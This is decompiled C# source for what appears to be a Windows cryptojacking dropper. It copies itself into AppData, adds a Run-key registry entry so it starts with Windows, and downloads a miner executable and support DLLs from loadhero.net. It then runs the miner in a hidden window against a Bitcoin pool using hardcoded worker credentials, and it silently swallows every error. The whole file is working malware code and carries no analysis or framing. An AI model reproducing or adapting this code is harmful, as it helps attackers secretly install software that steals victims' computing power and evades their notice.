using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
internal sealed class Main
{
	private static string MINEREXE_PATH = Path.Combine(Interaction.Environ("AppData"), "winminer.exe");

	private static string COINUTILDLL_PATH = Path.Combine(Interaction.Environ("AppData"), "coinutil.dll");

	private static string MINERDLL_PATH = Path.Combine(Interaction.Environ("AppData"), "miner.dll");

	private static string PHATKPTX_PATH = Path.Combine(Interaction.Environ("AppData"), "phatk.ptx");

	private static string USFT_EXTDLL_PATH = Path.Combine(Interaction.Environ("AppData"), "usft_ext.dll");

	private static string MINEREXE_URL = "http://loadhero.net/data/coin-miner.exe";

	private static string COINUTILDLL_URL = "http://loadhero.net/data/coinutil.dll";

	private static string MINERDLL_URL = "http://loadhero.net/data/miner.dll";

	private static string PHATKPTX_URL = "http://loadhero.net/data/phatk.ptx";

	private static string USFT_EXTDLL_URL = "http://loadhero.net/data/usft_ext.dll";

	private static void DownloadMinerExe()
	{
		using WebClient webClient = new WebClient();
		webClient.DownloadFile(MINEREXE_URL, MINEREXE_PATH);
	}

	private static void DownloadCoinutilDll()
	{
		using WebClient webClient = new WebClient();
		webClient.DownloadFile(COINUTILDLL_URL, COINUTILDLL_PATH);
	}

	private static void DownloadMinerDll()
	{
		using WebClient webClient = new WebClient();
		webClient.DownloadFile(MINERDLL_URL, MINERDLL_PATH);
	}

	private static void DownloadPhatkPtx()
	{
		using WebClient webClient = new WebClient();
		webClient.DownloadFile(PHATKPTX_URL, PHATKPTX_PATH);
	}

	private static void DownloadUsftExtDll()
	{
		using WebClient webClient = new WebClient();
		webClient.DownloadFile(USFT_EXTDLL_URL, USFT_EXTDLL_PATH);
	}

	public static void Start(string Pool, string Username, string Password, int nCores, int GPUPower, bool GPU = false)
	{
		if (!File.Exists(MINEREXE_PATH))
		{
			DownloadMinerExe();
		}
		if (!File.Exists(COINUTILDLL_PATH))
		{
			DownloadCoinutilDll();
		}
		if (!File.Exists(MINERDLL_PATH))
		{
			DownloadMinerDll();
		}
		if (!File.Exists(PHATKPTX_PATH))
		{
			DownloadPhatkPtx();
		}
		if (!File.Exists(USFT_EXTDLL_PATH))
		{
			DownloadUsftExtDll();
		}
		Process process = new Process();
		ProcessStartInfo startInfo = process.StartInfo;
		startInfo.FileName = "cmd.exe";
		startInfo.WindowStyle = ProcessWindowStyle.Hidden;
		startInfo.CreateNoWindow = true;
		if (GPU)
		{
			startInfo.Arguments = string.Format("/c " + MINEREXE_PATH + " -o http://{1}:{2}@{0} -g yes -I {4}", Pool, Username, Password, nCores, GPUPower);
		}
		else
		{
			startInfo.Arguments = string.Format("/c " + MINEREXE_PATH + " -o http://{1}:{2}@{0} -g no -t {3}", Pool, Username, Password, nCores);
		}
		startInfo = null;
		process.Start();
	}

	public static void Close()
	{
		Process[] processesByName = Process.GetProcessesByName("winminer");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
	}

	[STAThread]
	public static void Main()
	{
		Close();
		try
		{
			FileSystem.FileCopy(Process.GetCurrentProcess().MainModule!.FileName, Interaction.Environ("AppData") + "\\dtfr32.exe");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("dtfr32.exe", Interaction.Environ("AppData") + "\\dtfr32.exe");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		string pool = "api.bitcoin.cz:8332/";
		string username = "mikeboy39.worker1";
		string password = "QvSMrLXW";
		bool gPU = false;
		object obj = 0;
		int nCores = checked((int)Math.Round((double)Environment.ProcessorCount / 100.0 * 10.0));
		try
		{
			Start(pool, username, password, nCores, Conversions.ToInteger(obj), gPU);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}
}
